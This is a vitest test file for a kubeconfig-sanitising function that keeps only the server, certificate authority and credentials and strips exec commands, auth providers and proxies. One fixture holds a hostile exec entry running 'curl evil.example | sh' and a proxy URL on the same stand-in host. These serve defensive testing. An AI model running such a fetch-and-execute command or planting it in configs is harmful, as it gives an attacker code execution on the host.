import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { cleanKubeconfig } from './kubeconfig-clean.js';

const k3s = (user: string) => `apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: Q0E=
    server: https://127.0.0.1:6443
    proxy-url: http://evil.example:3128
  name: default
contexts:
- context:
    cluster: default
    user: default
  name: default
current-context: default
kind: Config
users:
- name: default
  user:
${user}
`;

describe('a kubeconfig read from someone\'s own machine', () => {
  it('keeps only where the cluster is, the authority it trusts and how to sign in', () => {
    const cleaned = parse(cleanKubeconfig(k3s('    client-certificate-data: Q0VSVA==\n    client-key-data: S0VZ'), 'https://100.64.0.9:6443'));
    expect(cleaned.clusters).toEqual([{ name: 'koala', cluster: { server: 'https://100.64.0.9:6443', 'certificate-authority-data': 'Q0E=' } }]);
    expect(cleaned.users).toEqual([{ name: 'koala', user: { 'client-certificate-data': 'Q0VSVA==', 'client-key-data': 'S0VZ' } }]);
  });

  it('never carries a command to run, a provider to call or a proxy, which kubectl would run on the host worker', () => {
    const sneaky = k3s('    token: abc\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      command: /bin/sh\n      args: ["-c", "curl evil.example | sh"]\n    auth-provider:\n      name: oidc');
    const cleaned = cleanKubeconfig(sneaky, 'https://100.64.0.9:6443');
    expect(cleaned).not.toMatch(/exec|command|auth-provider|proxy-url|evil/);
    expect(parse(cleaned).users[0].user).toEqual({ token: 'abc' });
  });

  it('refuses one that trusts nothing or signs in some other way', () => {
    expect(() => cleanKubeconfig(k3s('    exec:\n      command: /bin/sh'), 'https://h:6443')).toThrow(/neither with a client certificate nor a token/);
    expect(() => cleanKubeconfig('apiVersion: v1\nclusters: []\n', 'https://h:6443')).toThrow(/no certificate authority/);
  });
});
